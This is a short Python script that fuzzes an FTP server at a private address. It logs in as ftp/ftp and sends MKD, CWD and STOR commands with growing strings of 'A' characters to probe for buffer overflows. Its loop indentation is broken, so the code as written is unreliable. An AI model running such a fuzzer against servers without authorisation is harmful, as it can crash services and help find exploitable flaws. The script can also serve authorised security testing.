#!/usr/bin/env python
#--*-- coding:UTF-8 --*--
import socket
commande=['MKD','CWD','STOR']
for command in commande:
car=" "
while len(car)<2000:
	car=car+"A"*20
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.1.12",21))

	data=s.recv(1024)
	print data
	s.send("USER ftp\r\n")
	print s.recv(1024)
	s.send("PASS ftp\r\n")
	print s.recv(1024)
	commands=command + " "+car+"\r\n"
	s.send(commands)
	print commands + " : " + str(len(car))
	s.send("QUIT\r\n")
